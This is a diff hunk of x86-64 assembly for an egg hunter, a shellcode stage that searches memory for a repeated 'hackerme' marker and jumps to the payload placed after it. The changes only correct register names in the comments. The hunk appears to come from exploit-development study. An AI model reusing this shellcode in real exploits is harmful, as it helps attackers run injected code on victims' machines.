@@ -39,17 +39,17 @@ incrementer:
 	inc rdx				; increase edx by 1
 
 hunter:
-	lea rdi, [rdx + 8]		; put the address of edx plus 8 bytes into ebx for the syscall
-	xor rax, rax			; clear out eax
+	lea rdi, [rdx + 8]		; put the address of rdx plus 8 bytes into rbx for the syscall
+	xor rax, rax			; clear out rax
 	mov al, 0x56			; #define __NR_link       86 (0x56)	
 	syscall				; call it
 	cmp al, 0xf2			; compare the return value in eax
 	jz page_alignment		; short jump to next page if ZF set
 	mov rax, 0x656d72656b636168	; copy our comparison string into eax
-	mov rdi, rdx			; mov our value in edx into edi
-	scasq				; compare eax with dword at edi (in other words, check to see if we have 2 consecutive strings)
+	mov rdi, rdx			; mov our value in rdx into rdi
+	scasq				; compare rax with dword at rdi (in other words, check to see if we have 2 consecutive strings)
 	jnz incrementer			; short jump if ZF not set (no match)
-	scasq				; make the eax comparison again (match, compare again)
+	scasq				; make the rax comparison again (match, compare again)
 	jnz incrementer			; short jump if ZF not set (no match)
 	jmp rdi				; we found a match! pwnage!!! 
 
